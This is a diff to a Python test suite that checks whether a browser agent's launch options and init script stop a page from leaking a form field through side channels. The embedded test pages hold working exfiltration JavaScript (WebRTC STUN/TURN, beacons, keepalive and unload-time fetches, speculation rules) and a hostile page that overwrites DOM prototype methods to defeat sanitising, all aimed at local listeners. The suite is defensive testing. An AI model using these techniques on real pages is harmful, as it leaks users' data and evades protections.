@@ -738,7 +738,7 @@ class Listeners:
 
     PAGE = """<!doctype html><html><body><input id="email" value="sam.rivera@example.test"><script>
       const value = document.getElementById('email').value, base = location.origin, quic = 'https://127.0.0.1:%(udp)d', other = 'http://localhost:%(port)d';
-      const stream = 'ws://127.0.0.1:%(stream)d', worker = 'ws://127.0.0.1:%(worker)d';
+      const stream = 'ws://127.0.0.1:%(stream)d', worker = 'ws://127.0.0.1:%(worker)d', ice = '127.0.0.1:%(rtc)d', iceTcp = '127.0.0.1:%(rtctcp)d';
       const attempt = (name, fn) => { try { fn(); } catch (error) { /* the page cannot, and says nothing */ } };
       attempt('fetchLater', () => fetchLater(base + '/fetch-later?v=' + value, {method: 'POST', body: value, activateAfter: 0}));
       attempt('fedcm', () => navigator.credentials.get({identity: {providers: [{configURL: base + '/fedcm/' + value + '/config.json', clientId: 'x'}]}}).catch(() => 0));
@@ -752,10 +752,31 @@ class Listeners:
       attempt('cross-site', () => { new Image().src = other + '/cross-site?v=' + value; });
       attempt('webtransport', () => new WebTransport(quic + '/wt?v=' + value));
       attempt('worker-webtransport', () => new Worker(URL.createObjectURL(new Blob(["new WebTransport('" + quic + "/wtw?v=" + value + "')"], {type: 'text/javascript'}))));
+      // An ICE server named by an IP literal needs no name lookup, so the resolver rule does not stand in its way: STUN and TURN go out over a UDP socket of their own.
+      attempt('webrtc', () => {
+        const peer = new RTCPeerConnection({iceServers: [{urls: 'stun:' + ice}, {urls: 'turn:' + ice, username: value, credential: 'x'}, {urls: 'turn:' + iceTcp + '?transport=tcp', username: value, credential: 'x'}]});
+        peer.createDataChannel('x');
+        peer.createOffer().then((offer) => peer.setLocalDescription(offer));
+      });
+      // What a page sends as it goes away: no route handler is called for these once the page is closing, plain requests included.
+      for (const event of ['pagehide', 'unload', 'beforeunload', 'visibilitychange']) addEventListener(event, () => {
+        attempt('dismissal-image', () => { new Image().src = base + '/dismissal-image-' + event + '?v=' + value; });
+        attempt('dismissal-fetch', () => fetch(base + '/dismissal-fetch-' + event + '?v=' + value, {method: 'POST', body: value}));
+        attempt('dismissal-xhr', () => { const x = new XMLHttpRequest(); x.open('POST', base + '/dismissal-xhr-' + event + '?v=' + value); x.send(value); });
+        attempt('dismissal-link', () => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = base + '/dismissal-link-' + event + '?v=' + value; document.head.appendChild(l); });
+      });
+      addEventListener('pagehide', () => {
+        attempt('beacon', () => navigator.sendBeacon(base + '/beacon?v=' + value, value));
+        attempt('keepalive', () => fetch(base + '/keepalive?v=' + value, {method: 'POST', body: value, keepalive: true}));
+        attempt('keepalive-request', () => fetch(new Request(base + '/keepalive-request?v=' + value, {method: 'POST', body: value, keepalive: true})));
+      });
     </script></body></html>"""
 
+    def __init__(self, page=None):
+        self.page = page or self.PAGE
+
     def __enter__(self):
-        self.http_paths, self.tcp_lines, self.udp_count = [], [], 0
+        self.http_paths, self.tcp_lines, self.udp_count, self.rtc_count = [], [], 0, 0
         self.tcp = {}
         for name in ("stream", "worker"):
             self.tcp[name] = socket.socket()
@@ -764,6 +785,13 @@ class Listeners:
         self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.udp.bind(("127.0.0.1", 0))
         self.udp.settimeout(0.2)
+        # The ICE server: one UDP socket (STUN, TURN) and a TCP listener (TURN over TCP).
+        self.rtc_tcp = socket.socket()
+        self.rtc_tcp.bind(("127.0.0.1", 0))
+        self.rtc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.rtc.bind(("127.0.0.1", 0))
+        self.rtc.settimeout(0.2)
+        self.rtc_tcp.listen(16)
         listeners = self
 
         class Handler(BaseHTTPRequestHandler):
@@ -774,9 +802,9 @@ class Listeners:
                 length = int(self.headers.get("content-length") or 0)
                 body = self.rfile.read(length) if length else b""
                 listeners.http_paths.append((self.command, self.path, body.decode("utf-8", "replace")))
-                page = (Listeners.PAGE % {
+                page = (listeners.page % {
                     "stream": listeners.tcp["stream"].getsockname()[1], "worker": listeners.tcp["worker"].getsockname()[1], "udp": listeners.udp.getsockname()[1],
-                    "port": listeners.port,
+                    "rtc": listeners.rtc.getsockname()[1], "rtctcp": listeners.rtc_tcp.getsockname()[1], "port": listeners.port,
                 }).encode() if self.path == "/" else b""
                 self.send_response(200 if page else 204)
                 if page:
@@ -790,11 +818,21 @@ class Listeners:
         self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
         self.port = self.server.server_address[1]
         self.stopping = False
-        for target in (self.server.serve_forever, self.read_udp):
+        for target in (self.server.serve_forever, self.read_udp, self.read_rtc):
             threading.Thread(target=target, daemon=True).start()
         for listener in self.tcp.values():
             threading.Thread(target=self.accept_tcp, args=(listener,), daemon=True).start()
+        threading.Thread(target=self.accept_ice_tcp, daemon=True).start()
         return self
+
+    def accept_ice_tcp(self):
+        while not self.stopping:
+            try:
+                connection, _ = self.rtc_tcp.accept()
+            except OSError:
+                return
+            self.rtc_count += 1
+            connection.close()
 
     def accept_tcp(self, listener):
         def read(connection):
@@ -823,6 +861,16 @@ class Listeners:
             except OSError:
                 return
 
+    def read_rtc(self):
+        while not self.stopping:
+            try:
+                self.rtc.recvfrom(2048)
+                self.rtc_count += 1
+            except socket.timeout:
+                continue
+            except OSError:
+                return
+
     def __exit__(self, *_exc):
         self.stopping = True
         self.server.shutdown()
@@ -830,6 +878,8 @@ class Listeners:
         for listener in self.tcp.values():
             listener.close()
         self.udp.close()
+        self.rtc.close()
+        self.rtc_tcp.close()
 
     def channels(self):
         """Which of the page's attempts reached a listener."""
@@ -843,6 +893,12 @@ class Listeners:
             "speculation": any(path.startswith("/spec-prefetch") for path in paths),   # a prefetch the browser makes to another site
             "prerender": any(path.startswith("/spec-prerender") for path in paths),    # a prerender it makes of the page's own site
             "cross_site": any(path.startswith("/cross-site") for path in paths),       # a script's own request to another site (nothing routes it here)
+            "webrtc": self.rtc_count > 0,
+            "dismissal": any(path.startswith("/dismissal-") for path in paths),        # a plain request from a pagehide, unload or visibilitychange handler
+            "beacon": any(path.startswith("/beacon") for path in paths),               # sent as the page goes away
+            "keepalive": any(path.startswith("/keepalive?") for path in paths),        # a keepalive fetch sent as the page goes away
+            "keepalive_request": any(path.startswith("/keepalive-request") for path in paths),   # the same, built from a Request object
+            "same_site_speculation": any(path.startswith("/spec-same-") for path in paths),      # what a page whose own scripts fight the sweep still gets out
         }
         return {name for name, seen in reached.items() if seen}
 
@@ -856,29 +912,68 @@ class SideChannelTests(unittest.TestCase):
     channel, which is what makes silence under the agent's own launch options and init script mean something.
     """
 
-    ALL = {"fetchLater", "fedcm", "stream", "worker", "webtransport", "speculation", "prerender", "cross_site"}
+    ALL = {"fetchLater", "fedcm", "stream", "worker", "webtransport", "speculation", "prerender", "cross_site", "webrtc", "beacon", "keepalive", "keepalive_request", "dismissal"}
+    # A page whose own scripts first overwrite the methods the init script's sweep would use, then insert rules for a same-site prefetch and
+    # prerender, at once, a tick later, inside a shadow root and inside an iframe the page makes.
+    HOSTILE = """<!doctype html><html><body><input id="email" value="sam.rivera@example.test"><script>
+      const value = document.getElementById('email').value;
+      Element.prototype.remove = function () {};
+      Node.prototype.removeChild = function () { return null; };
+      Document.prototype.querySelectorAll = () => [];
+      Element.prototype.querySelectorAll = () => [];
+      DocumentFragment.prototype.querySelectorAll = () => [];
+      NodeList.prototype.forEach = function () {};
+      Array.prototype.forEach = function () {};
+      Function.prototype.call = function () {};
+      Function.prototype.apply = function () {};
+      const rules = (tag) => {
+        const node = document.createElement('script'); node.type = 'speculationrules';
+        node.textContent = JSON.stringify({prefetch: [{source: 'list', urls: ['/spec-same-prefetch-' + tag + '?v=' + value]}], prerender: [{source: 'list', urls: ['/spec-same-prerender-' + tag + '?v=' + value]}]});
+        return node;
+      };
+      document.head.appendChild(rules('now'));
+      setTimeout(() => document.head.appendChild(rules('later')), 300);
+      try { const host = document.createElement('div'); document.body.appendChild(host); host.attachShadow({mode: 'open'}).appendChild(rules('shadow')); } catch (error) { /* none */ }
+      try { const frame = document.createElement('iframe'); document.body.appendChild(frame); frame.contentDocument.head.appendChild(rules('frame')); } catch (error) { /* none */ }
+      try { const link = document.createElement('link'); link.rel = 'prerender'; link.href = '/spec-same-link?v=' + value; document.head.appendChild(link); } catch (error) { /* none */ }
+    </script></body></html>"""
 
-    def attempt(self, *, args=(), init=None):
+    def attempt(self, *, args=(), init=None, page=None, route=False, before_close=None):
+        """Which channels a listener heard. ``route`` refuses every request but the page's own, as the agent's route handler does."""
         from playwright.sync_api import sync_playwright
 
-        with Listeners() as listeners, sync_playwright() as playwright:
+        with Listeners(page) as listeners, sync_playwright() as playwright:
             browser = playwright.chromium.launch(headless=True, args=list(args))
             context = browser.new_context(**ApplyAgent.context_options())
             if init:
                 context.add_init_script(init)
+            seen = []
+            if route:
+                def handler(request_route):
+                    seen.append(request_route.request.url)
+                    if request_route.request.is_navigation_request() and request_route.request.url == f"http://127.0.0.1:{listeners.port}/":
+                        request_route.continue_()
+                    else:
+                        request_route.abort()
+
+                context.route("**/*", handler)
             page = context.new_page()
             page.goto(f"http://127.0.0.1:{listeners.port}/")
-            time.sleep(2.5)
-            page.close()   # fetchLater also fires when the page goes away
+            page.wait_for_timeout(2500)   # not time.sleep: Playwright's sync API runs a route handler only while it is being waited on
+            if before_close:
+                before_close(page)
+            page.close()   # fetchLater, a beacon and a keepalive fetch also fire when the page goes away
             time.sleep(1.5)
             context.close()
             browser.close()
+            self.routed = seen
             return listeners.channels()
 
     def test_the_control_is_heard_on_every_channel(self):
         heard = self.attempt()
         # QUIC to a loopback port can be filtered by a sandbox; the four that go over TCP and HTTP must be heard.
-        self.assertGreaterEqual(heard, {"fetchLater", "fedcm", "stream", "worker", "speculation", "prerender", "cross_site"}, heard)
+        self.assertGreaterEqual(heard, {"fetchLater", "fedcm", "stream", "worker", "speculation", "prerender", "cross_site", "webrtc", "dismissal"}, heard)
+        self.assertTrue(heard & {"beacon", "keepalive", "keepalive_request"}, heard)   # Chromium sometimes drops one of the three as the page closes
 
     def test_the_agents_launch_options_and_init_script_leave_every_listener_silent(self):
         heard = self.attempt(args=LOOPBACK_ARGS, init=apply_agent.NO_SIDE_CHANNELS)
@@ -892,10 +987,56 @@ class SideChannelTests(unittest.TestCase):
     def test_the_launch_switches_alone_close_what_they_name(self):
         heard = self.attempt(args=LOOPBACK_ARGS)
         # fetchLater, WebSocketStream and FedCM are the switches' to close, and the resolver rule closes every name but Greenhouse's: a
-        # prefetch to another site and a script's request to one go nowhere. Workers, WebTransport and a prerender of the page's own site
-        # have no switch: the init script's alone.
+        # prefetch to another site and a script's request to one go nowhere. Workers, WebTransport, WebRTC (an ICE server named by an IP
+        # address needs no lookup) and a prerender of the page's own site have no switch: the init script's alone.
         self.assertEqual(heard & {"fetchLater", "fedcm", "stream", "speculation", "cross_site"}, set())
         self.assertIn("worker", heard, "what no switch closes is still open without the init script")
+        self.assertIn("webrtc", heard, "no launch switch silences WebRTC to an ICE server named by an IP address, so the init script is its only layer")
+
+    def test_a_beacon_and_a_keepalive_fetch_sent_as_the_page_closes_are_never_sent(self):
+        # The route handler is not called for a request a closing page makes, so the page's own scripts must not be able to make one.
+        control = self.attempt(args=LOOPBACK_ARGS, route=True)
+        self.assertIn("dismissal", control, "plain requests made as the page closes are heard too, with a route that refuses everything but the page")
+        # Chromium sometimes drops one of the three requests a closing page makes at once, so the control needs one of them, not each.
+        self.assertTrue(control & {"beacon", "keepalive", "keepalive_request"}, "the control must be heard, with a route that refuses everything but the page")
+        heard = self.attempt(args=LOOPBACK_ARGS, init=apply_agent.NO_SIDE_CHANNELS, route=True)
+        self.assertEqual(heard & {"beacon", "keepalive", "keepalive_request", "dismissal"}, set())
+
+    def test_a_beacon_is_refused_and_a_keepalive_fetch_is_not_kept_alive_while_the_page_is_open(self):
+        from playwright.sync_api import sync_playwright
+
+        with Listeners() as listeners, sync_playwright() as playwright:
+            browser = playwright.chromium.launch(headless=True, args=LOOPBACK_ARGS)
+            context = browser.new_context(**ApplyAgent.context_options())
+            context.add_init_script(apply_agent.NO_SIDE_CHANNELS)
+            page = context.new_page()
+            page.goto(f"http://127.0.0.1:{listeners.port}/")
+            states = page.evaluate(
+                "() => ({beacon: navigator.sendBeacon('/x', 'y'), "
+                "kept: (() => { try { return new Request('/x', {method: 'POST', body: 'y', keepalive: true}).keepalive; } catch (error) { return 'threw'; } })(), "
+                "plain: new Request('/x').keepalive})")
+            frame = page.evaluate(
+                "() => { const f = document.createElement('iframe'); document.body.appendChild(f); return f.contentWindow.navigator.sendBeacon('/x', 'y'); }")
+            browser.close()
+        self.assertIs(states["beacon"], False)
+        self.assertIn(states["kept"], (False, "threw"))
+        self.assertIs(states["plain"], False)
+        self.assertIs(frame, False)
+
+    def test_a_page_that_overwrites_the_methods_the_sweep_uses_still_gets_no_speculation_rule_acted_on(self):
+        control = self.attempt(page=self.HOSTILE)
+        self.assertIn("same_site_speculation", control, "the control must be heard: the page's rules work when nothing takes them out")
+        heard = self.attempt(args=LOOPBACK_ARGS, init=apply_agent.NO_SIDE_CHANNELS, page=self.HOSTILE)
+        self.assertNotIn("same_site_speculation", heard)
+        self.assertEqual(heard, set())
+
+    def test_no_switch_closes_webrtc_to_an_ice_server_named_by_ip_so_the_init_script_is_its_only_layer(self):
+        # Measured on Playwright 1.62's Chromium: STUN over UDP and TURN over TCP both reach a listener under the resolver rule, and none of
+        # these switches silences both. If one ever does, add it to LAUNCH_ARGS and turn this into a test that it closes WebRTC.
+        for switch in ("--force-webrtc-ip-handling-policy=disable_non_proxied_udp", "--disable-blink-features=RTCPeerConnection", "--disable-features=WebRtcHideLocalIpsWithMdns"):
+            with self.subTest(switch=switch):
+                self.assertIn("webrtc", self.attempt(args=[*LOOPBACK_ARGS, switch]))
+        self.assertNotIn("webrtc", self.attempt(args=LOOPBACK_ARGS, init=apply_agent.NO_SIDE_CHANNELS))
 
     def test_the_resolver_rule_leaves_the_page_itself_loadable_and_nothing_else_resolvable(self):
         # The control for the two tests above: the page, served from the one address the rule was told about, loaded; any other name did not.
